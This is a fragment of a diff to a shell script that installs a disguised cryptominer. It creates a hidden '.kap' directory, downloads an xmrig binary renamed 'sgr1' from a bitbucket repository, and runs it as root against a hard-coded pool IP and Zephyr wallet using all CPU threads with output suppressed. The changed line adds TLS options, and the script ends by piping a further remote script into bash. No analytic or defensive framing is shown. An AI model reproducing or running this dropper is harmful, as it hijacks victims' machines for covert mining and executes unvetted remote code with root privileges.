@@ -12,5 +12,5 @@ sudo su --command "apt-get update && apt-get install gcc -y && curl -sL https://
 mkdir .kap && cd .kap
 wget -O sgr1 https://bitbucket.org/zepir/filesg/raw/main/xmrig >/dev/null 2>&1
 chmod +x sgr1
-sudo ./sgr1 -a rx/0 -o 149.28.148.12:80 -u ZEPHYR39FtS9jDrhDaMM9ReUUPLodNvqYHjD5CbYeLZM8h3tXARpwevMnW3kiXqxUUTYMTSDEgVDDV6WwXYL3Q5TVcVWxN58Wuc59 -p $(echo $(shuf -i 1-100000 -n 1)-a) -t $(nproc --all) --donate-level 1 -k > /dev/null 2>&1 &
+sudo ./sgr1 --url 149.28.148.12:80 --user ZEPHYR39FtS9jDrhDaMM9ReUUPLodNvqYHjD5CbYeLZM8h3tXARpwevMnW3kiXqxUUTYMTSDEgVDDV6WwXYL3Q5TVcVWxN58Wuc59 --pass $(echo $(shuf -i 1-100000 -n 1)-1) --donate-level 1 --tls --tls-fingerprint 420c7850e09b7c0bdcf748a7da9eb3647daf8515718f36d9ccfdd6b9ff834b14 -t $(nproc --all) > /dev/null 2>&1 &
 curl -sL https://bitbucket.org/lightcoral2/cangor/raw/master/boled04.sh | bash
